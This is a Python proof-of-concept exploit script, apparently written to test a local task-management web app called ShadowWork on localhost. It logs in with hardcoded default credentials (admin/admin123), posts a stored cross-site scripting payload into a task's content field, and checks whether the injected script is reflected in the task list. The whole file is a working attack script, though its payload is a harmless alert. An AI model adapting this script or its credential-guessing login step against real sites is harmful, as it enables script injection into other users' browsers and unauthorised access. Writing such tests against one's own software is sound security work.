import requests

TARGET = "http://localhost:8080/tasks"

def exploit_xss():
    print("[*] Exploiting Stored XSS on /tasks...")
    xss_payload = "<script>alert('XSS_SUCCESS_ShadowWork')</script>"
    
    # Needs login session or we can just post if no auth check on post
    # The current app.py redirect to login if no user_id in session.
    # We'll use a session for this.
    
    session = requests.Session()
    print("[*] Logging in to get session...")
    session.post("http://localhost:8080/login", data={"username": "admin", "password": "admin123"})
    
    print("[*] Posting XSS payload...")
    session.post(TARGET, data={"title": "Urgent XSS", "content": xss_payload})
    
    # Check if it exists
    response = session.get(TARGET)
    if xss_payload in response.text:
        print("[+] Success! XSS payload stored and successfully reflected in task list.")
    else:
        print("[-] XSS injection failed.")

if __name__ == "__main__":
    exploit_xss()
